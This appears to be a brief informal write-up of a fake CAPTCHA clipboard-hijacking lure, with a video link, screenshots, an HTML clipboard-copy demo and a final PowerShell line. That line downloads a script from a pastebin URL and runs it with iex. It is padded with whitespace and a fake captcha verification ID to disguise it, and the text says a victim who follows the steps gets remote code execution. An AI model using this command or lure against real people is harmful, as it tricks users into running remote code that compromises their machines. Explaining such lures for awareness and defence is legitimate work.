<https://youtu.be/lSa_wHW1pgQ?t=1268>
![unnamed_3fc16b5f76024155b7183fc5eb7e5b82](unnamed_3fc16b5f76024155b7183fc5eb7e5b82.png)

click this, it pops open with verification requests, by then u have already copy pasted malware on ur clipboard, if u follow the steps victim will get RCEd. 

![unnamed_96b19176e90d4a909d9a19c54f6eb104](unnamed_96b19176e90d4a909d9a19c54f6eb104.png)

`<``!DOCTYPE html``>`
`<``html lang="en"``>`
`<``head``>`
    `<``meta charset="UTF-8"``>`
    `<``title``>``Clipboard Example``<``/title``>`
    `<``style``>`
```

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
    
```
`<``/style``>`
`<``/head``>`
`<``body``>`
    `<``button id="copyButton"``>``Copy to clipboard``<``/button``>`
    `<``script``>`
```

        const copyButton = document.getElementById('copyButton');
        copyButton.addEventListener('click', function() {
            navigator.clipboard.writeText('This is the text to be copied.');
        });
    
```
`<``/script``>`
`<``/body``>`
`<``/html``>`

powershell -c iwr <https://pastebin.com/raw/4ea3QGs5> | iex                                                             # Captha verifiction ID Request: 123223 - 13321 🤖✅